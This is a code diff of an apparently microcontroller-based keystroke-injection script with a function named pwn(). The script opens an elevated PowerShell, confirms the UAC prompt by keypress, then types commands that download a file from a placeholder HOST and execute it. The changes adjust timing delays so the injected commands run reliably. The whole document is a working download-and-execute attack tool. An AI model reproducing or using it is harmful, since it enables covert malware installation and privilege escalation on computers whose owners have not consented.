@@ -44,20 +44,22 @@ void pwn()
   delay(delayTime);
 
   openapp("powershell Start-Process powershell -Verb runAs");
-  delay(2000);
+  delay(2500);
  key(KEY_LEFT, 0);
- delay(500);
+ delay(600);
  key(KEY_ENTER, 0);
- delay(1100);
+ delay(1500);
  Keyboard.println("$client = new-object System.Net.WebClient");
+ delay(200);
  Keyboard.println("$client.DownloadFile('HOST','PAYLOAD')");
+ delay(200);
  Keyboard.println("start PAYLOAD");
+ delay(200);
  Keyboard.println("exit");
- 
+
 }
 
 
 void loop() {
 
 }
-
